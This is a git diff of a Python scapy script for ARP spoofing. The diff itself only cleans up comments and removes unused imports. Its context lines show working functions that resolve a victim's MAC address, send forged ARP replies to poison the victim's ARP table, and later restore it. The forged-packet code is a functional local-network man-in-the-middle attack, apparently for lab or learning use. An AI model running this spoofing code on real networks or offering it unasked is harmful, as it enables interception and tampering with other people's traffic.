@@ -1,9 +1,6 @@
 from scapy.all import ARP, Ether, send, srp
 import time
 import sys
-# import os
-# import signal
-# import argparse
 
 # =============================
 # Example usage in Terminal:
@@ -19,9 +16,8 @@ import sys
 # =====================================
 
 
-# ================================
-# Function: Get MAC from IP
-# ================================
+# Get MAC from IP
+
 def get_mac(ip, interface):
     """
     Sends an ARP request and returns the MAC address for a given IP.
@@ -38,9 +34,7 @@ def get_mac(ip, interface):
         print(f"[!] No response for IP {ip}")
         sys.exit(1)
 
-# ================================
-# Function: Send ARP Spoof Packet
-# ================================
+# Send ARP Spoof Packet
 def spoof(victim_ip, victim_mac, spoof_ip, interface):
     """
     Sends a spoofed ARP reply to a victim to trick them.
@@ -50,9 +44,7 @@ def spoof(victim_ip, victim_mac, spoof_ip, interface):
     packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
     send(packet, verbose=False, iface=interface)
 
-# ================================
-# Function: Restore ARP Table
-# ================================
+# Restore ARP Table
 def restore(victim_ip, victim_mac, real_ip, real_mac, interface):
     """
     Sends the correct ARP reply to fix the ARP table after poisoning
